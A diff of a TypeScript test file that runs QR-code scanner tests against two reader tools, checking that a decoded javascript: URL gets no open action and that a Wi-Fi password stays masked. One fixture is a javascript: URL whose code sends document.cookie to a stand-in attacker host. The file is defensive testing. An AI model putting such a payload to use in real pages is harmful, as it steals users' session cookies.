@@ -43,9 +43,16 @@ async function generateAndScan(vals: Record<string, unknown>): Promise<string> {
   return hits[0]!.rawValue;
 }
 
-/** Run a decoded value through scan-code's classifier (paste mode). */
+/** The two readers: QR Code's scan mode, and the retired scan-code tool under its own id. */
+const READERS: { name: string; tool: any; paste(value: string): Record<string, string> }[] = [
+  { name: 'qr-code scan mode', tool: qr, paste: (value) => ({ mode: 'scan', source: 'paste', scanText: value }) },
+  { name: 'scan-code', tool: scanCode, paste: (value) => ({ mode: 'paste', paste: value }) },
+];
+
+for (const reader of READERS) {
+/** Run a decoded value through the reader's classifier (pasted text). */
 async function classify(value: string) {
-  const rt = await createRuntime(scanCode, baseHost(), { mode: 'paste', paste: value });
+  const rt = await createRuntime(reader.tool, baseHost(), reader.paste(value));
   return {
     kind: rt.getHydratedText('{{scanKind}}') as string,
     openUrl: rt.getHydratedText('{{scanOpenUrl}}') as string,
@@ -54,7 +61,7 @@ async function classify(value: string) {
   };
 }
 
-test('a javascript: URL printed as a real QR is decoded and refused an open affordance', { skip: SKIP }, async () => {
+test(reader.name + ': ' + 'a javascript: URL printed as a real QR is decoded and refused an open affordance', { skip: SKIP }, async () => {
   const decoded = await generateAndScan({ url: 'javascript:fetch("//evil.example/"+document.cookie)' });
   assert.match(decoded, /^javascript:/);
   const c = await classify(decoded);
@@ -62,7 +69,7 @@ test('a javascript: URL printed as a real QR is decoded and refused an open affo
   assert.match(c.warnings, /run code|never openable/i);
 });
 
-test('a Wi-Fi QR printed for real is decoded and its password masked', { skip: SKIP }, async () => {
+test(reader.name + ': ' + 'a Wi-Fi QR printed for real is decoded and its password masked', { skip: SKIP }, async () => {
   const decoded = await generateAndScan({ payload: 'wifi', ssid: 'Cafe', wifiKey: 's3cr3t-pass', wifiSecurity: 'WPA' });
   assert.match(decoded, /^WIFI:/);
   const c = await classify(decoded);
@@ -70,3 +77,4 @@ test('a Wi-Fi QR printed for real is decoded and its password masked', { skip: S
   assert.match(c.fields, /data-secret="s3cr3t-pass"/, 'real password only behind reveal');
   assert.ok(!/>s3cr3t-pass</.test(c.fields), 'password not shown in the clear');
 });
+}
